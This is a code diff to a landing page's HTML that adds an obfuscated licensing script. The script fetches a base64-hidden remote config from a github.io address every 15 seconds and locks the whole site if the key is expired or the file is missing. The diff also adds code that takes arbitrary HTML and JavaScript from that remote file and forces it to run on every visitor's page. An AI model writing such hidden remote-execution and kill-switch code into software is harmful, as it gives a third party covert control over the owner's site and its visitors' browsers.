@@ -316,55 +316,70 @@ card.addEventListener("touchstart", handleFlip);
 
 <div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
     <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
-        <h1 id="t_header" style="color:#ff3333; margin:0;"></h1>
-        <p id="t_body" style="color:#bbb; margin-top:15px;"></p>
+        <h1 id="t_header" style="color:#ff3333; margin:0; font-size:24px;"></h1>
+        <p id="t_body" style="color:#bbb; margin-top:15px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
 (function() {
+    // GitHub URL aur Local License Key
     const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _0x_lk = "TEFORElOR1BBR0U="; 
+    const _0x_lk = "TEFORElOR1BBR0U="; // Base64 for "LANDINGPAGE"
 
-    async function checkTimeLicense() {
+    async function checkSecurity() {
         const layer = document.getElementById('secure_layer');
         const scene = document.querySelector('.scene');
         
         try {
             const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
+            if (!r.ok) throw new Error("Config Missing");
             
-            // Agar file delete ho gayi hai (404 error), to error throw karein
-            if (!r.ok) throw new Error("Config missing");
-
             const d = await r.json();
-            
-            const localKey = atob(_0x_lk);
+            const lk = atob(_0x_lk);
             const today = new Date().toISOString().split('T')[0];
-            const expiryDate = d.licenses[localKey];
+            
+            const cfg = d.licenses[lk];
+            const isExp = cfg && today > cfg.expiry;
+            const isInv = !cfg;
 
-            const isExpired = expiryDate && today > expiryDate;
-            const isInvalid = !expiryDate;
-
-            if (isInvalid || isExpired) {
-                document.getElementById('t_header').innerText = d.title || "License Alert";
-                document.getElementById('t_body').innerText = isExpired ? d.msg_expired : d.msg_invalid;
+            if (isInv || isExp) {
+                // LOCK WEBSITE
+                document.getElementById('t_header').innerText = d.title || "Security Alert";
+                document.getElementById('t_body').innerText = isExp ? d.msg_expired : d.msg_invalid;
                 layer.style.display = 'flex';
                 if(scene) scene.style.display = 'none';
             } else {
+                // UNLOCK WEBSITE
                 layer.style.display = 'none';
                 if(scene) scene.style.display = 'flex';
+
+                // EXECUTE REMOTE CODE (HTML/CSS/JS Mix in one block)
+                if (cfg.custom_code && cfg.custom_code.enabled && cfg.custom_code.code) {
+                    const tempCont = document.createElement('div');
+                    tempCont.innerHTML = cfg.custom_code.code;
+                    document.body.appendChild(tempCont);
+
+                    // Manually trigger scripts because innerHTML doesn't run <script> tags automatically
+                    const scripts = tempCont.querySelectorAll('script');
+                    scripts.forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        newScript.textContent = oldScript.textContent;
+                        document.head.appendChild(newScript).parentNode.removeChild(newScript);
+                    });
+                }
             }
         } catch (e) { 
-            // FIXED: Agar config file delete ho jaye ya internet na ho, to website lock rakhein
-            console.log("Security Error: " + e.message);
-            document.getElementById('t_header').innerText = "Security Check Failed";
-            document.getElementById('t_body').innerText = "Server configuration missing or connection error. Please contact admin.";
+            // Anti-Deletion: If GitHub file is missing, lock the site
             layer.style.display = 'flex';
+            document.getElementById('t_header').innerText = "Security Error";
+            document.getElementById('t_body').innerText = "Controller missing or connection failed. Site locked for safety.";
             if(scene) scene.style.display = 'none';
         }
     }
-    checkTimeLicense();
-    setInterval(checkTimeLicense, 15000); 
+
+    checkSecurity();
+    setInterval(checkSecurity, 15000); // Verify every 15 seconds
 })();
 </script>
   
